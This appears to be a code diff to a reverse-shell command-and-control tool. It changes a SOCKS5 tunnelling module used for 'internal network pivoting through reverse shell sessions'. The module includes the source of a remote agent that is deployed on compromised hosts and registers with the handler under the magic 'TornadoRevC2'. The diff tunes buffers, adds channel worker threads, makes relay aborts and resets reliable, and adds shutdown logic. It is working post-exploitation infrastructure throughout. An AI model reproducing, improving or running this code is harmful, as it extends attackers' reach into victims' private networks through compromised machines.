@@ -12,28 +12,33 @@ import time
 from .constants import TUNNEL_MARK_END, TUNNEL_MARK_START, TUNNEL_REGISTER_MAGIC
 
 TUNNEL_POOL_SIZE = 6
-RELAY_CHUNK = 262144
-UPLOAD_QUEUE_SIZE = 32
-MAX_FRAME = 32 * 1024 * 1024
-RELAY_IDLE_TIMEOUT = 8.0
-RELAY_ACTIVE_TIMEOUT = 180.0
-SOCK_BUF = 4 * 1024 * 1024
+RELAY_CHUNK = 65536
+UPLOAD_QUEUE_SIZE = 16
+DOWNLOAD_QUEUE_SIZE = 16
+MAX_FRAME = 4 * 1024 * 1024
+RELAY_IDLE_TIMEOUT = 2.0
+RELAY_ACTIVE_TIMEOUT = 60.0
+SOCK_BUF = 256 * 1024
 FRAME_JSON = 0
 FRAME_SEND = 1
 FRAME_RECV_REQ = 2
 FRAME_RECV_RESP = 3
-MAX_IDLE_ROUNDS = 90
+MAX_IDLE_ROUNDS = 15
+MAX_CONCURRENT_RELAYS = 128
+CHANNEL_QUEUE_SIZE = 128
+RELAY_JOIN_TIMEOUT = 5.0
+AGENT_VERSION = 2
 
 _REMOTE_AGENT_SOURCE = r'''
 import base64, json, socket, struct, sys, threading, time
 
 CHANNELS = 6
-MAX_BUF = 33554432
-HIGH_WATER = 25165824
-LOW_WATER = 8388608
-MAX_FRAME = 33554432
-RECV_SIZE = 262144
-SOCK_BUF = 4194304
+MAX_BUF = 4194304
+HIGH_WATER = 3145728
+LOW_WATER = 1048576
+MAX_FRAME = 4194304
+RECV_SIZE = 65536
+SOCK_BUF = 262144
 
 def recv_exact(conn, n):
     data = b''
@@ -126,7 +131,7 @@ def detect_handler_ip(revshell_port, fallback='127.0.0.1'):
 
 def reset_entry(entry):
     with entry['buf_lock']:
-        entry['buf'] = b''
+        entry['buf'].clear()
     entry['drain'].set()
 
 def gc_streams(streams, lock):
@@ -152,7 +157,7 @@ def pump(entry):
         if buf_len >= HIGH_WATER:
             drain.clear()
         if buf_len >= MAX_BUF or not drain.is_set():
-            drain.wait(timeout=0.5)
+            drain.wait(timeout=0.2)
             continue
         try:
             piece = sock.recv(RECV_SIZE)
@@ -161,10 +166,11 @@ def pump(entry):
                 reset_entry(entry)
                 break
             with buf_lock:
-                entry['buf'] += piece
-                if len(entry['buf']) >= HIGH_WATER:
+                entry['buf'].extend(piece)
+                buf_len = len(entry['buf'])
+                if buf_len >= HIGH_WATER:
                     drain.clear()
-                elif len(entry['buf']) <= LOW_WATER:
+                elif buf_len <= LOW_WATER:
                     drain.set()
         except socket.timeout:
             continue
@@ -176,8 +182,9 @@ def pump(entry):
 def read_buf(entry, max_bytes):
     with entry['buf_lock']:
         if entry['buf']:
-            chunk = entry['buf'][:max_bytes]
-            entry['buf'] = entry['buf'][len(chunk):]
+            n = min(max_bytes, len(entry['buf']))
+            chunk = bytes(entry['buf'][:n])
+            del entry['buf'][:n]
             if len(entry['buf']) <= LOW_WATER:
                 entry['drain'].set()
             return chunk, entry['closed']
@@ -224,7 +231,7 @@ def serve(conn, streams, lock):
                     remote = socket.create_connection((host, port), timeout=10)
                     tune_sock(remote)
                     entry = {
-                        'sock': remote, 'buf': b'', 'buf_lock': threading.Lock(),
+                        'sock': remote, 'buf': bytearray(), 'buf_lock': threading.Lock(),
                         'drain': threading.Event(), 'closed': False,
                     }
                     entry['drain'].set()
@@ -306,7 +313,7 @@ def worker(streams, lock, handler_host, handler_port, token):
         try:
             conn = socket.create_connection((handler_host, handler_port), timeout=20)
             tune_sock(conn)
-            send_json(conn, {'op': 'register', 'token': token, 'magic': 'TornadoRevC2'})
+            send_json(conn, {'op': 'register', 'token': token, 'magic': 'TornadoRevC2', 'ver': 2})
             ack = recv_frame(conn)
             if not ack or not ack.get('ok'):
                 conn.close()
@@ -423,6 +430,81 @@ def _send_framed(conn, payload_bytes):
     conn.sendall(struct.pack('>I', len(payload)) + payload)
 
 
+class _RelayHandle:
+    """Tracks one active SOCKS relay so reset can abort it cleanly."""
+
+    __slots__ = ('sid', 'stop', 'threads', 'send_queue', 'recv_queue')
+
+    def __init__(self, sid):
+        self.sid = sid
+        self.stop = threading.Event()
+        self.threads = []
+        self.send_queue = None
+        self.recv_queue = None
+
+
+class _ChannelWorker:
+    """Serialize all I/O on one tunnel channel through a single worker thread."""
+
+    __slots__ = ('manager', 'client_sock', 'conn', 'queue', 'stop', 'thread')
+
+    def __init__(self, manager, client_sock, conn):
+        self.manager = manager
+        self.client_sock = client_sock
+        self.conn = conn
+        self.queue = queue.Queue(maxsize=CHANNEL_QUEUE_SIZE)
+        self.stop = threading.Event()
+        self.thread = threading.Thread(target=self._run, daemon=True, name='tunnel-ch')
+        self.thread.start()
+
+    def alive(self):
+        return not self.stop.is_set() and self.manager._conn_alive(self.conn)
+
+    def submit(self, fn, timeout=60.0):
+        if not self.alive():
+            return None, True
+        result_box = []
+        done = threading.Event()
+        try:
+            self.queue.put((fn, result_box, done), timeout=min(timeout, 5.0))
+        except queue.Full:
+            return None, False
+        if not done.wait(timeout):
+            return None, False
+        return result_box[0] if result_box else (None, True)
+
+    def _run(self):
+        while not self.stop.is_set():
+            try:
+                item = self.queue.get(timeout=0.5)
+            except queue.Empty:
+                continue
+            fn, result_box, done = item
+            try:
+                if self.manager._conn_alive(self.conn):
+                    result_box.append(fn())
+                else:
+                    result_box.append((None, True))
+            except Exception:
+                result_box.append((None, True))
+            finally:
+                done.set()
+
+    def drain(self):
+        while True:
+            try:
+                _fn, result_box, done = self.queue.get_nowait()
+                result_box.append((None, True))
+                done.set()
+            except queue.Empty:
+                break
+
+    def shutdown(self):
+        self.stop.set()
+        self.drain()
+        self.thread.join(timeout=2.0)
+
+
 class TunnelManager:
     """Manage SOCKS5 proxies for internal network pivoting through reverse shell sessions."""
 
@@ -433,12 +515,15 @@ class TunnelManager:
         self._proxies = {}
         self._session_agents = {}
         self._session_pools = {}       # client_sock -> [conn, ...]
-        self._conn_locks = {}          # id(conn) -> Lock
+        self._channel_workers = {}     # id(conn) -> _ChannelWorker
         self._channel_load = {}        # id(conn) -> active relay count
         self._channel_rr = {}          # client_sock -> int
         self._token_sessions = {}
         self._channel_ready = {}
         self._session_stream_counters = {}
+        self._session_reset_gen = {}   # client_sock -> int
+        self._active_relays = {}       # client_sock -> {sid: _RelayHandle}
+        self._relay_sems = {}          # client_sock -> Semaphore
         self._deploy_locks = {}
         self._tunnel_listener = None
         self._tunnel_port = None
@@ -497,8 +582,8 @@ class TunnelManager:
                     conn.close()
                     return
                 pool.append(conn)
-                self._conn_locks.setdefault(id(conn), threading.Lock())
                 self._channel_load.setdefault(id(conn), 0)
+                self._channel_workers[id(conn)] = _ChannelWorker(self, session_sock, conn)
             _send_json(conn, {'ok': True})
             ready = self._channel_ready.get(token)
             if ready:
@@ -527,12 +612,73 @@ class TunnelManager:
     def _has_channels(self, client_sock):
         return bool(self._alive_conns(client_sock))
 
-    def _conn_lock(self, conn):
+    def _conn_worker(self, conn):
         key = id(conn)
         with self._lock:
-            if key not in self._conn_locks:
-                self._conn_locks[key] = threading.Lock()
-            return self._conn_locks[key]
+            worker = self._channel_workers.get(key)
+            if worker is None and self._conn_alive(conn):
+                worker = _ChannelWorker(self, None, conn)
+                self._channel_workers[key] = worker
+            return worker
+
+    def _relay_sem(self, client_sock):
+        with self._lock:
+            sem = self._relay_sems.get(client_sock)
+            if sem is None:
+                sem = threading.Semaphore(MAX_CONCURRENT_RELAYS)
+                self._relay_sems[client_sock] = sem
+            return sem
+
+    def _reset_gen(self, client_sock):
+        with self._lock:
+            return self._session_reset_gen.get(client_sock, 0)
+
+    def _bump_reset_gen(self, client_sock):
+        with self._lock:
+            gen = self._session_reset_gen.get(client_sock, 0) + 1
+            self._session_reset_gen[client_sock] = gen
+            return gen
+
+    def _register_relay(self, client_sock, sid):
+        handle = _RelayHandle(sid)
+        with self._lock:
+            self._active_relays.setdefault(client_sock, {})[sid] = handle
+        return handle
+
+    def _unregister_relay(self, client_sock, sid):
+        with self._lock:
+            relays = self._active_relays.get(client_sock)
+            if relays:
+                relays.pop(sid, None)
+                if not relays:
+                    self._active_relays.pop(client_sock, None)
+
+    def _abort_session_relays(self, client_sock, timeout=RELAY_JOIN_TIMEOUT):
+        with self._lock:
+            relays = list(self._active_relays.get(client_sock, {}).values())
+        for handle in relays:
+            handle.stop.set()
+            if handle.send_queue is not None:
+                try:
+                    handle.send_queue.put_nowait(None)
+                except queue.Full:
+                    pass
+            if handle.recv_queue is not None:
+                try:
+                    handle.recv_queue.put_nowait(None)
+                except queue.Full:
+                    pass
+        self._drain_channel_workers(client_sock)
+        deadline = time.time() + timeout
+        for handle in relays:
+            for thread in handle.threads:
+                remaining = max(0.01, deadline - time.time())
+                thread.join(timeout=remaining)
+        with self._lock:
+            self._active_relays.pop(client_sock, None)
+
+    def _relay_stale(self, client_sock, gen):
+        return gen != self._reset_gen(client_sock) or client_sock not in self.h.revshell_clients
 
     def _pick_channel(self, client_sock):
         alive = self._alive_conns(client_sock)
@@ -555,23 +701,37 @@ class TunnelManager:
             return self._channel_load.get(id(conn), 0)
 
     def _remove_conn(self, client_sock, conn):
+        key = id(conn)
         with self._lock:
             pool = self._session_pools.get(client_sock, [])
             if conn in pool:
                 pool.remove(conn)
-            self._conn_locks.pop(id(conn), None)
-            self._channel_load.pop(id(conn), None)
+            worker = self._channel_workers.pop(key, None)
+            self._channel_load.pop(key, None)
+        if worker:
+            worker.shutdown()
         try:
             conn.close()
         except OSError:
             pass
 
     def _drop_pool(self, client_sock):
-        for conn in self._alive_conns(client_sock):
-            self._remove_conn(client_sock, conn)
         with self._lock:
+            pool = list(self._session_pools.get(client_sock, []))
+            workers = [self._channel_workers.pop(id(c), None) for c in pool]
             self._session_pools.pop(client_sock, None)
             self._channel_rr.pop(client_sock, None)
+            for key in list(self._channel_load.keys()):
+                if any(id(c) == key for c in pool):
+                    self._channel_load.pop(key, None)
+        for worker in workers:
+            if worker:
+                worker.shutdown()
+        for conn in pool:
+            try:
+                conn.close()
+            except OSError:
+                pass
 
     def _pick_two_channels(self, client_sock):
         alive = self._alive_conns(client_sock)
@@ -593,9 +753,6 @@ class TunnelManager:
         self._channel_request(
             client_sock, {'op': 'close', 'sid': sid}, timeout=3.0, preferred=preferred,
         )
-        self._channel_request(
-            client_sock, {'op': 'reset', 'sid': sid}, timeout=3.0, preferred=preferred,
-        )
 
     def _wait_for_channel(self, client_sock, token, timeout=30.0):
         ready = self._channel_ready.get(token)
@@ -610,13 +767,12 @@ class TunnelManager:
 
     def _request_on(self, conn, message, timeout=30.0):
         """Send one JSON request; return (response, hard_fail)."""
-        if not self._conn_alive(conn):
+        worker = self._conn_worker(conn)
+        if not worker or not worker.alive():
             return None, True
-        lock = self._conn_lock(conn)
-        with lock:
+
+        def op():
             try:
-                if not self._conn_alive(conn):
-                    return None, True
                 conn.settimeout(timeout)
                 _send_json(conn, message)
                 resp, hard_fail = _read_frame(conn, timeout=timeout)
@@ -631,11 +787,14 @@ class TunnelManager:
                 except OSError:
                     pass
 
+        return worker.submit(op, timeout=timeout + 5.0)
+
     def _send_bulk(self, conn, sid, data, timeout=RELAY_ACTIVE_TIMEOUT):
-        if not self._conn_alive(conn):
+        worker = self._conn_worker(conn)
+        if not worker or not worker.alive():
             return False, True
-        lock = self._conn_lock(conn)
-        with lock:
+
+        def op():
             try:
                 body = struct.pack('>BI', FRAME_SEND, sid) + data
                 conn.settimeout(timeout)
@@ -654,11 +813,17 @@ class TunnelManager:
                 except OSError:
                     pass
 
+        result = worker.submit(op, timeout=timeout + 5.0)
+        if result is None:
+            return False, False
+        return result
+
     def _recv_bulk(self, conn, sid, max_bytes=RELAY_CHUNK, timeout=RELAY_IDLE_TIMEOUT):
-        if not self._conn_alive(conn):
+        worker = self._conn_worker(conn)
+        if not worker or not worker.alive():
             return b'', False, True
-        lock = self._conn_lock(conn)
-        with lock:
+
+        def op():
             try:
                 body = struct.pack('>BII', FRAME_RECV_REQ, sid, max_bytes)
                 conn.settimeout(timeout)
@@ -681,6 +846,11 @@ class TunnelManager:
                     conn.settimeout(None)
                 except OSError:
                     pass
+
+        result = worker.submit(op, timeout=timeout + 5.0)
+        if result is None:
+            return b'', False, False
+        return result
 
     def _channel_request(self, client_sock, message, timeout=30.0, preferred=None):
         tried = set()
@@ -754,8 +924,9 @@ class TunnelManager:
         return True
 
     def _deploy_agent(self, client_sock):
-        if self._session_agents.get(client_sock, {}).get('ready') and self._has_channels(client_sock):
-            return self._session_agents[client_sock]
+        cached = self._session_agents.get(client_sock)
+        if cached and cached.get('ready') and cached.get('ver') == AGENT_VERSION and self._has_channels(client_sock):
+            return cached
 
         info = self.h._client_info(client_sock)
         if not info:
@@ -813,7 +984,7 @@ class TunnelManager:
             self._set_error(f'agent did not connect to handler port {tunnel_port}')
             return None
 
-        agent = {'token': token, 'ready': True, 'remote_path': agent_path}
+        agent = {'token': token, 'ready': True, 'remote_path': agent_path, 'ver': AGENT_VERSION}
         self._session_agents[client_sock] = agent
         self._last_error = ''
         n = len(self._alive_conns(client_sock))
@@ -898,6 +1069,9 @@ class TunnelManager:
             self._token_sessions.pop(token, None)
             self._channel_ready.pop(token, None)
             self._session_stream_counters.pop(client_sock, None)
+            self._session_reset_gen.pop(client_sock, None)
+            self._active_relays.pop(client_sock, None)
+            self._relay_sems.pop(client_sock, None)
             self._deploy_locks.pop(client_sock, None)
 
         ok = result == 'OK'
@@ -911,7 +1085,9 @@ class TunnelManager:
         for pid, p in list(self._proxies.items()):
             if p.get('client_sock') == client_sock:
                 self._stop_proxy(pid, reason='session disconnected', cleanup_remote=False)
-        self._channel_request(client_sock, {'op': 'purge'}, timeout=5.0)
+        self._bump_reset_gen(client_sock)
+        self._abort_session_relays(client_sock, timeout=RELAY_JOIN_TIMEOUT)
+        self._purge_all_channels(client_sock, timeout=5.0)
         self._cleanup_remote_tunnel_artifacts(client_sock, reason='session disconnected')
 
     def start_socks(self, client_sock, listen_port):
@@ -949,6 +1125,7 @@ class TunnelManager:
             self._proxies[proxy_id] = proxy
 
         def accept_loop():
+            sem = self._relay_sem(client_sock)
             while not stop_event.is_set():
                 try:
                     listener.settimeout(1.0)
@@ -956,9 +1133,17 @@ class TunnelManager:
                         conn, _ = listener.accept()
                     except socket.timeout:
                         continue
+                    if not sem.acquire(blocking=False):
+                        try:
+                            conn.close()
+                        except OSError:
+                            pass
+                        continue
                     _set_keepalive(conn)
                     threading.Thread(
-                        target=self._handle_socks_client, args=(client_sock, conn), daemon=True,
+                        target=self._handle_socks_client,
+                        args=(client_sock, conn, sem),
+                        daemon=True,
                     ).start()
                 except OSError:
                     break
@@ -970,8 +1155,31 @@ class TunnelManager:
         print(f"{self.h.colors['cyan']}  test reachability: socks test <host> <port>{self.h.colors['end']}")
         return True
 
+    def _purge_all_channels(self, client_sock, timeout=10.0):
+        """Broadcast purge to every live channel so all agent workers clear state."""
+        ok = False
+        for conn in self._alive_conns(client_sock):
+            resp, hard_fail = self._request_on(conn, {'op': 'purge'}, timeout=timeout)
+            if resp and resp.get('ok'):
+                ok = True
+            elif hard_fail:
+                self._remove_conn(client_sock, conn)
+        return ok
+
+    def _gc_all_channels(self, client_sock, timeout=5.0):
+        for conn in self._alive_conns(client_sock):
+            resp, hard_fail = self._request_on(conn, {'op': 'gc'}, timeout=timeout)
+            if hard_fail:
+                self._remove_conn(client_sock, conn)
+
+    def _drain_channel_workers(self, client_sock):
+        for conn in self._alive_conns(client_sock):
+            worker = self._conn_worker(conn)
+            if worker:
+                worker.drain()
+
     def _socks_reset(self, client_sock):
-        """Reset tunnel agent streams and discard buffered data without stopping SOCKS listeners."""
+        """Fully reset tunnel: abort local relays, purge remote streams, restore clean state."""
         info = self.h._client_info(client_sock)
         if not info:
             print(f"{self.h.colors['red']}Session not active{self.h.colors['end']}")
@@ -979,17 +1187,44 @@ class TunnelManager:
         if not self._has_channels(client_sock):
             print(f"{self.h.colors['red']}No active tunnel channels for #{info['id']}{self.h.colors['end']}")
             return True
-        resp, _conn = self._channel_request(client_sock, {'op': 'purge'}, timeout=10.0)
-        if resp and resp.get('ok'):
+
+        self._bump_reset_gen(client_sock)
+        self._abort_session_relays(client_sock, timeout=RELAY_JOIN_TIMEOUT)
+        self._drain_channel_workers(client_sock)
+
+        with self._lock:
+            self._session_stream_counters[client_sock] = 0
+            for conn in self._alive_conns(client_sock):
+                self._channel_load[id(conn)] = 0
+
+        ok = self._purge_all_channels(client_sock, timeout=10.0)
+        self._gc_all_channels(client_sock, timeout=5.0)
+
+        alive = self._alive_conns(client_sock)
+        ping_ok = False
+        for conn in alive:
+            resp, hard_fail = self._request_on(conn, {'op': 'ping'}, timeout=5.0)
+            if resp and resp.get('ok'):
+                ping_ok = True
+            elif hard_fail:
+                self._remove_conn(client_sock, conn)
+
+        if ok and ping_ok:
+            n = len(self._alive_conns(client_sock))
             print(
                 f"{self.h.colors['green']}Tunnel reset OK for #{info['id']} "
-                f"(streams and buffers cleared){self.h.colors['end']}"
+                f"({n} channel(s), relays aborted, buffers cleared){self.h.colors['end']}"
             )
-            self._log(client_sock, 'SOCKS tunnel reset: streams and buffers cleared')
+            self._log(client_sock, f'SOCKS tunnel reset: {n} channel(s) clean')
         else:
-            err = self._last_error or 'no response'
-            print(f"{self.h.colors['red']}Tunnel reset failed for #{info['id']}: {err}{self.h.colors['end']}")
-            self._log(client_sock, f'SOCKS tunnel reset failed: {err}')
+            err = self._last_error or 'partial reset'
+            n = len(self._alive_conns(client_sock))
+            color = self.h.colors['yellow'] if n else self.h.colors['red']
+            print(
+                f"{color}Tunnel reset {'partial' if n else 'failed'} for #{info['id']}: "
+                f"{n} channel(s) remaining{self.h.colors['end']}"
+            )
+            self._log(client_sock, f'SOCKS tunnel reset {"partial" if n else "failed"}: {err}')
         return True
 
     def _socks_test(self, client_sock, host, port):
@@ -1044,20 +1279,41 @@ class TunnelManager:
                 return None
         return data if len(data) == n else None
 
-    def _relay_reader(self, conn, send_queue, stop):
-        """Read from the local SOCKS client with backpressure via a bounded queue."""
-        while not stop.is_set():
+    def _write_to_client(self, conn, data, stop, timeout=30.0):
+        """Write to a non-blocking local SOCKS client with backpressure."""
+        offset = 0
+        deadline = time.time() + timeout
+        while offset < len(data) and not stop.is_set():
             try:
-                r, _, _ = select.select([conn], [], [], 0.1)
+                sent = conn.send(data[offset:])
+                if sent == 0:
+                    return False
+                offset += sent
+            except BlockingIOError:
+                remaining = deadline - time.time()
+                if remaining <= 0:
+                    return False
+                _, writable, _ = select.select([], [conn], [], min(remaining, 0.25))
+                if not writable:
+                    continue
+            except OSError:
+                return False
+        return offset == len(data)
+
+    def _relay_reader(self, conn, send_queue, stop, reset_gen, client_sock):
+        """Read from the local SOCKS client; pause when upload queue is full."""
+        while not stop.is_set() and not self._relay_stale(client_sock, reset_gen):
+            try:
+                r, _, _ = select.select([conn], [], [], 0.25)
                 if not r:
                     continue
                 data = conn.recv(RELAY_CHUNK)
                 if not data:
                     stop.set()
                     break
-                while not stop.is_set():
+                while not stop.is_set() and not self._relay_stale(client_sock, reset_gen):
                     try:
-                        send_queue.put(data, timeout=0.5)
+                        send_queue.put(data, timeout=1.0)
                         break
                     except queue.Full:
                         continue
@@ -1066,9 +1322,13 @@ class TunnelManager:
                 break
         stop.set()
 
-    def _relay_upload(self, client_sock, up_conn, sid, send_queue, stop):
+    def _relay_upload(self, client_sock, up_conn, sid, send_queue, stop, reset_gen):
         """Drain the upload queue to the tunnel agent."""
-        while not stop.is_set() and client_sock in self.h.revshell_clients and self._conn_alive(up_conn):
+        while (
+            not stop.is_set()
+            and not self._relay_stale(client_sock, reset_gen)
+            and self._conn_alive(up_conn)
+        ):
             try:
                 data = send_queue.get(timeout=0.5)
             except queue.Empty:
@@ -1079,14 +1339,19 @@ class TunnelManager:
             if not ok:
                 if hard_fail:
                     self._remove_conn(client_sock, up_conn)
-                    stop.set()
+                stop.set()
                 break
         stop.set()
 
-    def _relay_download(self, client_sock, down_conn, sid, conn, stop):
+    def _relay_download(self, client_sock, down_conn, sid, recv_queue, stop, reset_gen):
+        """Poll agent for data and push into bounded download queue."""
         idle_rounds = 0
         had_data = False
-        while not stop.is_set() and client_sock in self.h.revshell_clients and self._conn_alive(down_conn):
+        while (
+            not stop.is_set()
+            and not self._relay_stale(client_sock, reset_gen)
+            and self._conn_alive(down_conn)
+        ):
             data, closed, hard_fail = self._recv_bulk(
                 down_conn, sid, RELAY_CHUNK,
                 timeout=RELAY_ACTIVE_TIMEOUT if had_data else RELAY_IDLE_TIMEOUT,
@@ -1096,11 +1361,12 @@ class TunnelManager:
                 stop.set()
                 break
             if data:
-                try:
-                    conn.sendall(data)
-                except OSError:
-                    stop.set()
-                    break
+                while not stop.is_set() and not self._relay_stale(client_sock, reset_gen):
+                    try:
+                        recv_queue.put(data, timeout=1.0)
+                        break
+                    except queue.Full:
+                        continue
                 idle_rounds = 0
                 had_data = True
             else:
@@ -1113,24 +1379,49 @@ class TunnelManager:
                 break
         stop.set()
 
-    def _relay_single(self, client_sock, tunnel_conn, sid, conn):
-        stop = threading.Event()
+    def _relay_writer(self, conn, recv_queue, stop, reset_gen, client_sock):
+        """Drain download queue to local SOCKS client with write backpressure."""
+        while not stop.is_set() and not self._relay_stale(client_sock, reset_gen):
+            try:
+                data = recv_queue.get(timeout=0.5)
+            except queue.Empty:
+                continue
+            if data is None:
+                break
+            if not self._write_to_client(conn, data, stop):
+                stop.set()
+                break
+        stop.set()
+
+    def _relay_single(self, client_sock, tunnel_conn, sid, conn, reset_gen, handle):
+        stop = handle.stop
         send_queue = queue.Queue(maxsize=UPLOAD_QUEUE_SIZE)
+        recv_queue = queue.Queue(maxsize=DOWNLOAD_QUEUE_SIZE)
+        handle.send_queue = send_queue
+        handle.recv_queue = recv_queue
         threads = [
             threading.Thread(
-                target=self._relay_reader, args=(conn, send_queue, stop), daemon=True,
+                target=self._relay_reader,
+                args=(conn, send_queue, stop, reset_gen, client_sock),
+                daemon=True,
             ),
             threading.Thread(
                 target=self._relay_upload,
-                args=(client_sock, tunnel_conn, sid, send_queue, stop),
+                args=(client_sock, tunnel_conn, sid, send_queue, stop, reset_gen),
                 daemon=True,
             ),
             threading.Thread(
                 target=self._relay_download,
-                args=(client_sock, tunnel_conn, sid, conn, stop),
+                args=(client_sock, tunnel_conn, sid, recv_queue, stop, reset_gen),
+                daemon=True,
+            ),
+            threading.Thread(
+                target=self._relay_writer,
+                args=(conn, recv_queue, stop, reset_gen, client_sock),
                 daemon=True,
             ),
         ]
+        handle.threads = threads
         self._inc_channel_load(tunnel_conn, 2)
         try:
             for thread in threads:
@@ -1139,38 +1430,57 @@ class TunnelManager:
                 thread.join()
         finally:
             self._inc_channel_load(tunnel_conn, -2)
-            while True:
-                try:
-                    send_queue.get_nowait()
-                except queue.Empty:
-                    break
-            self._close_stream_on_agent(client_sock, sid, preferred=tunnel_conn)
+            stop.set()
+            for q in (send_queue, recv_queue):
+                while True:
+                    try:
+                        q.put_nowait(None)
+                    except queue.Full:
+                        break
+                while True:
+                    try:
+                        q.get_nowait()
+                    except queue.Empty:
+                        break
+            if not self._relay_stale(client_sock, reset_gen):
+                self._close_stream_on_agent(client_sock, sid, preferred=tunnel_conn)
 
-    def _relay(self, client_sock, up_conn, down_conn, sid, conn):
+    def _relay(self, client_sock, up_conn, down_conn, sid, conn, reset_gen, handle):
         """Full-duplex bulk relay; falls back to single-channel mode when needed."""
         if up_conn is down_conn:
-            self._relay_single(client_sock, up_conn, sid, conn)
+            self._relay_single(client_sock, up_conn, sid, conn, reset_gen, handle)
             return
 
-        stop = threading.Event()
+        stop = handle.stop
         send_queue = queue.Queue(maxsize=UPLOAD_QUEUE_SIZE)
+        recv_queue = queue.Queue(maxsize=DOWNLOAD_QUEUE_SIZE)
+        handle.send_queue = send_queue
+        handle.recv_queue = recv_queue
         self._inc_channel_load(up_conn, 1)
         self._inc_channel_load(down_conn, 1)
         threads = [
             threading.Thread(
-                target=self._relay_reader, args=(conn, send_queue, stop), daemon=True,
+                target=self._relay_reader,
+                args=(conn, send_queue, stop, reset_gen, client_sock),
+                daemon=True,
             ),
             threading.Thread(
                 target=self._relay_upload,
-                args=(client_sock, up_conn, sid, send_queue, stop),
+                args=(client_sock, up_conn, sid, send_queue, stop, reset_gen),
                 daemon=True,
             ),
             threading.Thread(
                 target=self._relay_download,
-                args=(client_sock, down_conn, sid, conn, stop),
+                args=(client_sock, down_conn, sid, recv_queue, stop, reset_gen),
+                daemon=True,
+            ),
+            threading.Thread(
+                target=self._relay_writer,
+                args=(conn, recv_queue, stop, reset_gen, client_sock),
                 daemon=True,
             ),
         ]
+        handle.threads = threads
         try:
             for thread in threads:
                 thread.start()
@@ -1179,13 +1489,21 @@ class TunnelManager:
         finally:
             self._inc_channel_load(up_conn, -1)
             self._inc_channel_load(down_conn, -1)
-            while True:
-                try:
-                    send_queue.get_nowait()
-                except queue.Empty:
-                    break
-            preferred = up_conn if self._conn_alive(up_conn) else down_conn
-            self._close_stream_on_agent(client_sock, sid, preferred=preferred)
+            stop.set()
+            for q in (send_queue, recv_queue):
+                while True:
+                    try:
+                        q.put_nowait(None)
+                    except queue.Full:
+                        break
+                while True:
+                    try:
+                        q.get_nowait()
+                    except queue.Empty:
+                        break
+            if not self._relay_stale(client_sock, reset_gen):
+                preferred = up_conn if self._conn_alive(up_conn) else down_conn
+                self._close_stream_on_agent(client_sock, sid, preferred=preferred)
 
     def _conn_alive(self, conn):
         try:
@@ -1193,9 +1511,11 @@ class TunnelManager:
         except OSError:
             return False
 
-    def _handle_socks_client(self, client_sock, conn):
+    def _handle_socks_client(self, client_sock, conn, relay_sem=None):
         sid = None
         tunnel_conn = None
+        handle = None
+        reset_gen = self._reset_gen(client_sock)
         try:
             conn.settimeout(15.0)
             greeting = self._recv_exact(conn, 2)
@@ -1227,11 +1547,16 @@ class TunnelManager:
                 return
             port = struct.unpack('!H', pb)[0]
 
+            if self._relay_stale(client_sock, reset_gen):
+                conn.sendall(b'\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00')
+                return
+
             sid = self._next_stream_id(client_sock)
+            handle = self._register_relay(client_sock, sid)
             tunnel_conn = self._pick_channel(client_sock)
             resp = None
             for _ in range(TUNNEL_POOL_SIZE + 1):
-                if not tunnel_conn:
+                if not tunnel_conn or self._relay_stale(client_sock, reset_gen):
                     break
                 resp, tunnel_conn = self._channel_request(
                     client_sock,
@@ -1243,7 +1568,7 @@ class TunnelManager:
                     break
                 tunnel_conn = self._pick_channel(client_sock)
 
-            if not resp or not resp.get('ok'):
+            if not resp or not resp.get('ok') or self._relay_stale(client_sock, reset_gen):
                 err = (resp or {}).get('error', self._last_error or 'no response')
                 self._log(client_sock, f"SOCKS connect {host}:{port} failed: {err}")
                 conn.sendall(b'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00')
@@ -1255,16 +1580,18 @@ class TunnelManager:
             if not up_conn:
                 up_conn = tunnel_conn
                 down_conn = tunnel_conn
-            self._relay(client_sock, up_conn, down_conn, sid, conn)
-        except Exception:
+            self._relay(client_sock, up_conn, down_conn, sid, conn, reset_gen, handle)
+        except OSError:
             pass
         finally:
-            if sid is not None:
-                self._close_stream_on_agent(client_sock, sid, preferred=tunnel_conn)
+            if handle is not None and sid is not None:
+                self._unregister_relay(client_sock, sid)
             try:
                 conn.close()
             except OSError:
                 pass
+            if relay_sem is not None:
+                relay_sem.release()
 
     def _stop_proxy(self, proxy_id, reason='operator request', cleanup_remote=True):
         with self._lock:
@@ -1281,6 +1608,48 @@ class TunnelManager:
         if cs and cleanup_remote and not any(p.get('client_sock') == cs for p in self._proxies.values()):
             self._cleanup_remote_tunnel_artifacts(cs, reason=reason)
         return True
+
+    def shutdown_all(self):
+        """Stop all SOCKS proxies during server shutdown or restart."""
+        for proxy_id in list(self._proxies.keys()):
+            self._stop_proxy(proxy_id, reason='server shutdown', cleanup_remote=False)
+
+    def shutdown_for_restart(self):
+        """Fast local teardown for process restart — skip remote agent cleanup."""
+        for proxy_id in list(self._proxies.keys()):
+            self._stop_proxy(proxy_id, reason='server restart', cleanup_remote=False)
+
+        with self._lock:
+            sessions = list(self._session_pools.keys())
+            listener = self._tunnel_listener
+            self._tunnel_listener = None
+
+        if listener is not None:
+            try:
+                listener.shutdown(socket.SHUT_RDWR)
+            except OSError:
+                pass
+            try:
+                listener.close()
+            except OSError:
+                pass
+
+        for client_sock in sessions:
+            self._bump_reset_gen(client_sock)
+            self._abort_session_relays(client_sock, timeout=1.0)
+            self._drop_pool(client_sock)
+            with self._lock:
+                agent = self._session_agents.pop(client_sock, None)
+                self._active_relays.pop(client_sock, None)
+                self._relay_sems.pop(client_sock, None)
+                self._deploy_locks.pop(client_sock, None)
+                self._session_stream_counters.pop(client_sock, None)
+                self._session_reset_gen.pop(client_sock, None)
+                if agent:
+                    token = agent.get('token')
+                    if token:
+                        self._token_sessions.pop(token, None)
+                        self._channel_ready.pop(token, None)
 
     def list_tunnels(self):
         proxies = list(self._proxies.values())
